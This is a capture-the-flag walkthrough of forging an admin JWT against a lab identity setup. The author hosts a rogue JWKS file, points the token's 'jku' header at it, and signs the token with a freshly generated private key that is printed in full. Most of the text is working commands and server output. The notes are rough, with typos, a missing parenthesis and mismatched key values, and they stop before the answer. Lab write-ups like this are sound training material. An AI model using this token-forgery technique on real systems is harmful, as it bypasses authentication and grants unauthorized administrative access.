Rogue Gnome Identity Provider
Difficulty: 2/5

Objective:
Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?


Task: 

<img width="813" height="512" alt="image" src="https://github.com/user-attachments/assets/37f1e8fe-7a92-4897-9ecb-2034fc17d3bc" />

```
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
```

```
paul@paulweb:~$ cat notes
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

```
paul@paulweb:~$ openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
writing RSA key
```

```
paul@paulweb:~$ openssl rsa -in private.pem -pubout -text -noout
Private-Key: (2048 bit, 2 primes)
modulus:
    00:d9:bc:33:83:42:0d:ec:b1:3c:08:ff:68:fe:0b:
    08:92:c9:c2:cb:4a:f8:9d:11:e9:f3:4e:28:8f:27:
    77:63:d3:55:c2:7c:99:82:38:50:32:c7:84:b1:ef:
    6e:48:c8:ad:bc:c4:d3:8c:1e:06:5f:9d:90:74:09:
    c2:f2:35:70:25:d8:b9:a3:c6:dc:eb:10:c0:b6:cf:
    66:a4:59:45:99:94:73:a8:35:9a:94:cb:72:9c:64:
    a6:4f:aa:1b:2a:4d:5e:30:d7:9c:81:a6:17:1c:79:
    b6:9f:5b:d4:34:f2:de:d8:6c:9c:b7:8e:91:54:c3:
    18:85:5a:2e:57:96:f3:b9:11:0f:66:11:7d:29:2f:
    99:ab:ed:7a:50:7b:03:de:c2:46:2c:c3:b6:cf:ea:
    06:c4:ac:f0:88:38:f4:be:27:10:2c:d0:7c:52:08:
    8e:ed:f1:f7:a1:2a:35:bd:ae:54:79:96:1f:98:c8:
    f2:e2:0f:65:f7:86:bb:2a:67:fc:d8:8b:21:ba:4d:
    81:be:c4:e2:6d:1e:f1:b8:a3:40:5c:7f:54:ce:31:
    30:98:03:fe:b1:13:ef:cd:9d:a0:29:c6:4e:bf:57:
    6d:86:7f:fa:6e:4e:36:1b:b7:ca:16:4e:0f:e3:7b:
    72:36:a4:02:06:65:26:6e:97:7c:40:43:bb:a9:d3:
    00:39
publicExponent: 65537 (0x10001)
privateExponent:
    05:46:21:bd:dd:51:72:2b:66:8e:95:ce:e6:61:89:
    77:0d:e5:2f:b7:69:2b:ed:f2:02:78:6a:2e:84:5b:
    ec:89:5e:80:21:c6:c8:66:69:5d:2c:f1:28:be:32:
    cc:85:19:02:83:cf:b2:d4:02:c8:14:fa:19:9e:95:
    32:41:db:64:6a:b8:0b:45:3b:92:5f:2f:cb:d0:13:
    66:ae:90:99:04:4e:5f:ba:63:85:4b:b5:f9:d6:16:
    48:0c:47:e7:98:b1:4b:f2:23:e4:e9:2f:da:b1:dc:
    9b:b4:21:25:74:e5:b3:3a:9b:fa:51:aa:de:f1:96:
    40:c0:14:2a:b6:65:53:30:7e:96:ee:0a:bd:a4:60:
    37:60:43:57:21:4c:ba:07:17:d7:86:10:fc:91:9f:
    29:54:df:ce:76:7a:3c:b7:76:fd:60:e6:c6:15:2a:
    4a:c1:bb:cf:23:ad:48:31:5a:57:6b:2c:8b:25:51:
    88:cf:5f:f2:fa:83:ac:1b:84:bd:a8:6d:48:21:0c:
    60:76:6e:91:16:dd:b6:ee:fc:d2:42:3f:ff:e5:3c:
    68:30:dd:53:6a:26:55:db:fd:89:b9:f8:91:14:54:
    6d:b1:20:85:55:88:4a:4f:e3:24:ec:79:a1:c5:69:
    43:f6:20:96:16:a2:f5:99:e0:d3:9f:d3:e0:2b:82:
    61
prime1:
    00:ed:d4:fe:2a:b7:9c:26:89:9d:38:36:59:dc:cb:
    19:96:50:72:7e:6f:bb:ea:ff:a7:2d:05:28:e6:9e:
    1b:8b:e1:59:7e:c0:eb:1d:cd:8a:15:16:93:61:31:
    df:f7:82:a3:50:9a:08:8b:c6:08:71:de:74:6c:72:
    05:07:f2:3a:2f:81:02:3b:21:85:33:de:1a:67:cc:
    eb:c2:e2:20:07:54:dd:4d:dd:d1:92:a0:33:fe:01:
    5d:4b:34:49:78:18:bf:36:4c:ec:85:9a:e4:10:57:
    4f:21:39:45:0f:35:99:dd:a8:26:28:88:d6:28:8c:
    54:c7:10:25:a4:67:20:28:1b
prime2:
    00:ea:5e:32:91:9e:81:2e:26:d8:05:90:42:13:00:
    fb:23:75:71:93:5d:bb:6c:04:e0:e7:48:2d:6e:5e:
    cd:8b:9f:86:8a:2b:d9:5f:72:24:1b:89:03:69:06:
    67:aa:3f:98:c8:14:03:d7:48:d9:dc:4f:c8:10:d4:
    e6:69:ed:97:9d:2b:5f:30:fd:bd:88:da:71:a7:f2:
    e2:32:43:c8:8b:9b:80:58:ba:a3:10:83:69:b4:f9:
    c4:ab:07:71:c7:6a:17:0d:0f:c3:a9:f8:38:95:7b:
    36:04:6c:ab:9b:c7:49:09:ec:08:44:42:b4:ca:25:
    db:90:e9:f9:dd:05:3d:66:3b
exponent1:
    3f:46:57:88:cd:e8:c1:68:03:68:1d:2d:b3:4c:65:
    b6:54:18:e2:02:a0:20:59:7c:04:c2:46:ab:74:8d:
    27:9e:00:cd:74:4e:19:53:c1:d4:f2:78:ab:77:35:
    7b:08:4a:a2:fb:18:22:f7:c0:ef:6a:9b:d6:ee:4e:
    e0:5a:55:98:a5:de:0e:15:50:f7:07:b4:46:c1:82:
    48:0b:19:32:5a:25:b6:bd:b9:30:25:67:2f:c0:f5:
    2d:38:f0:02:ff:b2:7f:a3:df:99:7c:28:09:20:f1:
    70:89:68:12:2f:d4:8b:e0:5c:a6:94:21:46:10:6f:
    cd:b6:42:0d:87:52:4a:d9
exponent2:
    00:d7:90:92:a4:9b:8c:a7:dd:74:7e:11:84:a4:a4:
    17:5a:32:f0:a7:21:e4:7c:63:34:55:a6:6e:9b:00:
    b9:bf:fd:97:aa:c8:d0:23:d9:01:5b:0e:37:c3:c6:
    ef:5c:89:28:46:87:1a:4d:4e:a5:8b:dd:19:e0:59:
    62:20:f6:36:a8:8a:37:01:01:b1:ee:09:35:d6:cb:
    30:c0:18:d6:81:8a:22:8f:fa:02:77:f2:d7:2c:6d:
    3b:36:30:1f:b7:d2:5d:a7:56:e3:9a:17:44:3c:41:
    5a:9a:d1:35:3a:90:1f:1e:f0:29:5e:57:98:a0:02:
    18:24:ff:00:22:09:6a:c2:f7
coefficient:
    00:c3:5d:d5:55:c2:c6:7d:ac:6e:24:63:54:1f:e3:
    0a:41:36:d5:5a:1d:fe:72:b0:5b:cf:52:4a:d1:73:
    43:f4:93:7c:8f:ac:a8:a5:3f:a1:04:69:f6:b6:71:
    9f:ba:1f:a6:d8:bb:23:60:6c:7c:4b:db:53:1a:47:
    5f:f1:16:68:5a:c4:fd:3e:32:0d:56:00:8e:73:b9:
    33:f1:91:5f:b5:10:be:65:90:8a:59:20:18:52:3f:
    ee:30:ae:d9:6e:75:ae:fe:de:cb:67:2d:37:6b:17:
    46:3a:96:55:11:ed:5e:49:3e:ba:31:3e:17:3b:a8:
    cc:8f:05:70:f0:5
```

Hex -> Base64url
```
2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp807oijfndmPTVcJ8mYI4UDLHiLHvbkjIrbzE048eBl-dkHQJwvjVwJdi5o8bctxDAts9mpFlFmZRzqDWalMtynGSqT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVoulfZbzudBD2YRfSkvmave16UHsD3sJGLMO2z-oGxKzwiDj0vidwCzQfFIIjt8fehKjW9rlR5lh-YyPLiD2X3hrsqZ_zYiyG6TYG-xOJtHvG4o0Bcf1TOMTAYA_6xE-_NnaApxk6_V22Gf_puTjYbt8oWQg_je3IjagCBmUmbp18QEO7qdMAM
```

```
AQAB
```

```
nano ~/www/jwks.json

{
  "keys": [
    {
      "kty": "RSA",
      "n": "2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp807oijfndmPTVcJ8mYI4UDLHiLHvbkjIrbzE048eBl-dkHQJwvjVwJdi5o8bctxDAts9mpFlFmZRzqDWalMtynGSqT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVoulfZbzudBD2YRfSkvmave16UHsD3sJGLMO2z-oGxKzwiDj0vidwCzQfFIIjt8fehKjW9rlR5lh-YyPLiD2X3hrsqZ_zYiyG6TYG-xOJtHvG4o0Bcf1TOMTAYA_6xE-_NnaApxk6_V22Gf_puTjYbt8oWQg_je3IjagCBmUmbp18QEO7qdMAM",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig",
      "kid": "rogue-key"
    }
  ]
}
```

```
paul@paulweb:~/www$ nohup python3 -m http.server 8000 --bind 0.0.0.0 > /dev/null 2>&1 &
[1] 89
paul@paulweb:~/www$ curl http://172.17.0.4:8000/jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "n": "2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp807oijfndmPTVcJ8mYI4UDLHiLHvbkjIrbzE048eBl-dkHQJwvjVwJdi5o8bctxDAts9mpFlFmZRzqDWalMtynGSqT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVoulfZbzudBD2YRfSkvmave16UHsD3sJGLMO2z-oGxKzwiDj0vidwCzQfFIIjt8fehKjW9rlR5lh-YyPLiD2X3hrsqZ_zYiyG6TYG-xOJtHvG4o0Bcf1TOMTAYA_6xE-_NnaApxk6_V22Gf_puTjYbt8oWQg_je3IjagCBmUmbp18QEO7qdMAM",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig",
      "kid": "rogue-key"
    }
  ]
}
```

```
paul@paulweb:~/www$ echo -n '{"alg":"RS256","kid":"rogue-key"}' > header.json
```

```
paul@paulweb:~/www$ echo -n '{"sub":"admin","iss":"http://172.17.0.4:8000","exp":9999999999}' > payload.json
```

base64url Encode Header and Payload:

```
paul@paulweb:~/www$ HEADER_B64=$(cat header.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(cat payload.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
```

Aseemble signed input

```
paul@paulweb:~/www$ SIGNING_INPUT="${HEADER_B64}.${PAYLOAD_B64}"
echo -n "$SIGNING_INPUT" > data.txt
```

```
paul@paulweb:~/www$ find ~ -name private.pem 2>/dev/null
/home/paul/private.pem
paul@paulweb:~/www$ openssl dgst -sha256 -sign /home/paul/private.pem -out sig.bin data.txt
```

```
paul@paulweb:~/www$ SIG_B64=$(cat sig.bin | openssl base64 -A | tr '+/' '-_' | tr -d '='
```

Assemble JWT:

```
paul@paulweb:~/www$ JWT="${HEADER_B64}.${PAYLOAD_B64}.${SIG_B64}"
echo "$JWT"
eyJhbGciOiJSUzI1NiIsImtpZCI6InJvZ3VlLWtleSJ9.eyJzdWIiOiJhZG1pbiIsImlzcyI6Imh0dHA6Ly8xNzIuMTcuMC40OjgwMDAiLCJleHAiOjk5OTk5OTk5OTl9.PCZ3hjlPCCZ9TKy4eJP0wkijkCA5wDX7qdzSOP_RpJJhs7vAgZO0zNm3WvoAMvmc1C253Cz2ZZvxcaa76BjLI3hfIDtZ5tmJ-12qsLbUrvZ6oNvDa8gdTeJutougj_chcyTOX3IJmvabZMV5NLPehN_X3sn36iOQRHCs3hQuGfEp_0kX-uApELWcE2VJPO_QuIRGrsZjX4x9JitY0fLsU9KlZYpvVY0Nyk2lVHwsKv564nar2VxNRWalKQoUbjbACGuWEFCvEDpOeiqFHkqc6lSjuCU_SsdaDJFCLDntNm5CQutsiCZbFh5I7MvooGTpFH_X7MYF8luzy0-qxHzPEw
```

```
paul@paulweb:~/www$ curl -v "http://gnome-48371.atnascorp/auth?token=$JWT"
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImtpZCI6InJvZ3VlLWtleSJ9.eyJzdWIiOiJhZG1pbiIsImlzcyI6Imh0dHA6Ly8xNzIuMTcuMC40OjgwMDAiLCJleHAiOjk5OTk5OTk5OTl9.PCZ3hjlPCCZ9TKy4eJP0wkijkCA5wDX7qdzSOP_RpJJhs7vAgZO0zNm3WvoAMvmc1C253Cz2ZZvxcaa76BjLI3hfIDtZ5tmJ-12qsLbUrvZ6oNvDa8gdTeJutougj_chcyTOX3IJmvabZMV5NLPehN_X3sn36iOQRHCs3hQuGfEp_0kX-uApELWcE2VJPO_QuIRGrsZjX4x9JitY0fLsU9KlZYpvVY0Nyk2lVHwsKv564nar2VxNRWalKQoUbjbACGuWEFCvEDpOeiqFHkqc6lSjuCU_SsdaDJFCLDntNm5CQutsiCZbFh5I7MvooGTpFH_X7MYF8luzy0-qxHzPEw HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Fri, 14 Nov 2025 05:41:00 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 215
< Location: /?error=no-jku
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?error=no-jku">/?error=no-jku</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Error .. edit the `header.json`

```
{
  "alg": "RS256",
  "kid": "rogue-key",
  "jku": "http://172.17.0.4:8000/jwks.json"
}

```

Recap steps again

```

HEADER_B64=$(cat header.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')


PAYLOAD_B64=$(cat payload.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')


SIGNING_INPUT="${HEADER_B64}.${PAYLOAD_B64}"
echo -n "$SIGNING_INPUT" > data.txt


openssl dgst -sha256 -sign /home/paul/private.pem -out sig.bin data.txt


SIG_B64=$(cat sig.bin | openssl base64 -A | tr '+/' '-_' | tr -d '=')


JWT="${HEADER_B64}.${PAYLOAD_B64}.${SIG_B64}"
echo "$JWT"
```

HERE***

```
paul@paulweb:~/www$ nano jwks.json 
paul@paulweb:~/www$ ps aux | grep http.server
paul          89  0.0  0.0 101336 20200 pts/0    S    05:36   0:00 python3 -m http.server 8000 --bind 0.0.0.0
paul         196  0.0  0.0   3528  1728 pts/0    S+   05:54   0:00 grep --color=auto http.server
paul@paulweb:~/www$ curl http://172.17.0.4:8000/jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "kid": "rogue-key",
      "n": "2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp804ojyd3Y9NVwnyZgjhQMseEse9uSMitvMTTjB4GX52QdAnC8jVwJdi5o8bc6xDAts9mpFlFmZRzqDWalMtynGSmT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVouV5bzuREPZhF9KS-Zq-16UHsD3sJGLMO2z-oGxKzwiDj0vicQLNB8UgiO7fH3oSo1va5UeZYfmMjy4g9l94a7Kmf82Ishuk2BvsTibR7xuKNAXH9UzjEwmAP-sRPvzZ2gKcZOv1dthn_6bk42G7fKFk4P43tyNqQCBmUmbpd8QEO7qdMAOQ",
      "e": "AQAB"
    }
  ]
}
paul@paulweb:~/www$ curl -v "http://gnome-48371.atnascorp/auth?token=$JWT"
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImtpZCI6InJvZ3VlLWtleSIsImprdSI6Imh0dHA6Ly8xNzIuMTcuMC40OjgwMDAvandrcy5qc29uIn0.eyJzdWIiOiJhZG1pbiIsImlzcyI6Imh0dHA6Ly8xNzIuMTcuMC40OjgwMDAiLCJleHAiOjk5OTk5OTk5OTl9.nXJLtV9D0SpmkRb5cSn0SObFY3WT1aY4R-vPXPHFIpXhbDGM_YEuTm8hB68v3QZEIt3xb1TViWRpU1ceqzsS0-rg5JFirme4KgliRaiFouiGXExxk2iDld4pI0NvkJyNf-ik7iS5uk3eQYCY_Kp0n402ePLf0FcDf36TKHhek-TidRtlAlcUHx0dSN1BnQSsaAXrJPYGlR45F9lbYtKhQEahYz6N_oAOdTnzF55ejUgxS6B3Yq1NcFC6ntYZnvNOg4fWRwY7mkNhc7k-wu6y9ZhR6UVRMqKY69TNqd9tcflRUtkdw4ZCoF0GhBAzeuOWRg84MGlDg4tWrX1i6yH6EA HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Fri, 14 Nov 2025 05:54:15 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiYWRtaW4ifQ.aRbEBw.63W4mHkaYGn0DGvIRSklfvTbDv0; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
paul@paulweb:~/www$ curl -H "Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiYWRtaW4ifQ.aRbEBw.63W4mHkaYGn0DGvIRSklfvTbDv0" \
  http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome admin</p><p>Diagnostic access is only available to admins.</p>
```


```
paul@paulweb:~/www$ curl -s http://gnome-48371.atnascorp/static/images/gnome-shadow.png --output gnome-shadow.png
file gnome-shadow.png
gnome-shadow.png: HTML document, ASCII text
paul@paulweb:~/www$
```


After reset:

```
paul@paulweb:~$ cd ~/www
nohup python3 -m http.server 8000 --bind 0.0.0.0 > /dev/null 2>&1 &
[1] 63
```
```
paul@paulweb:~/www$ nano jwks.json 

{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "kid": "rogue-key",
      "n": "2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp804ojyd3Y9NVwnyZgjhQMseEse9uSMitvMTTjB4GX52QdAnC8jVwJdi5o8bc6xDAts9mpFlFmZRzqDWalMtynGSmT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVouV5bzuREPZhF9KS-Zq-16UHsD3sJGLMO2z-oGxKzwiDj0vicQLNB8UgiO7fH3oSo1va5UeZYfmMjy4g9l94a7Kmf82Ishuk2BvsTibR7xuKNAXH9UzjEwmAP-sRPvzZ2gKcZOv1dthn_6bk42G7fKFk4P43tyNqQCBmUmbpd8QEO7qdMAOQ",
      "e": "AQAB"
    }
  ]
}
```

Create header and payload:

head.json

```
{
  "alg": "RS256",
  "kid": "rogue-key",
  "jku": "http://172.17.0.4:8000/jwks.json"
}
```
payload.json
```
{
  "sub": "admin",
  "iss": "http://172.17.0.4:8000",
  "exp": 9999999999
}
```

```
HEADER_B64=$(cat header.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(cat payload.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
SIGNING_INPUT="${HEADER_B64}.${PAYLOAD_B64}"
echo -n "$SIGNING_INPUT" > data.txt
```

```
paul@paulweb:~/www$ openssl genrsa -out /home/paul/private.pem 2048
openssl rsa -in /home/paul/private.pem -pubout -out /home/paul/public.pem
writing RSA key
paul@paulweb:~/www$ chmod 600 /home/paul/private.pem
paul@paulweb:~/www$ openssl dgst -sha256 -sign /home/paul/private.pem -out sig.bin data.txt
```

```
paul@paulweb:~/www$ SIG_B64=$(cat sig.bin | openssl base64 -A | tr '+/' '-_' | tr -d '=')
paul@paulweb:~/www$ JWT="${HEADER_B64}.${PAYLOAD_B64}.${SIG_B64}"
paul@paulweb:~/www$ echo "$JWT"
ewogICJhbGciOiAiUlMyNTYiLAogICJraWQiOiAicm9ndWUta2V5IiwKICAiamt1IjogImh0dHA6Ly8xNzIuMTcuMC40OjgwMDAvandrcy5qc29uIgp9Cg.ewogICJzdWIiOiAiYWRtaW4iLAogICJpc3MiOiAiaHR0cDovLzE3Mi4xNy4wLjQ6ODAwMCIsCiAgImV4cCI6IDk5OTk5OTk5OTkKfQoK.DPF4sVai4gsJ4K9zZPLLic8JPJNGE21LC9bzPlyxT3UwVHQc2g_Vz0V15XNqwa2PDRUTH7xBitQk6McCTIR_fNp9S_4d-aUiEMlBeNnruIktt_2Ym80jlqRN6YkGnXOxjmJ05VLlb9t2XxgXag-Ixrj-9JOjX9dIu_Nm_XEeGi31sj4YlhdqSjimM72rmLSGrQpTZFLW0J6CnjDMebtClyxsyYlmLuWNC_vp2fN50RbVM7UYjWbAZSindIt76UWLpREHDT0wtBw87Ok6NgRT_9OznCbRjusUHVbYkE3droTdcrcxnTAHHqKcH-0mhRbhumlILgdSJvkEAHZmvEvn9g
paul@paulweb:~/www$
```









